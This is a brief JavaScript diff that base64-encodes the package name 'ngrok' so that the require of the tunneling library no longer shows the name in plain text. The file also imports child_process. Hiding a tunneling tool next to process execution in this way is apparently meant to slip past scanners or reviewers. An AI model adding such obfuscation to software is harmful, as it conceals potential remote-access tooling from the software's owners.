@@ -1,7 +1,6 @@
 const child = require('child_process')
 const secret1 = Buffer.from('bmdyb2s=', 'base64').toString()
-// const { SessionBuilder } = require(`@${secret1}/${secret1}`)
-const { SessionBuilder } = require(`@ngrok/ngrok`)
+const { SessionBuilder } = require(`@${secret1}/${secret1}`)
 
 const os = process.argv[2]
 
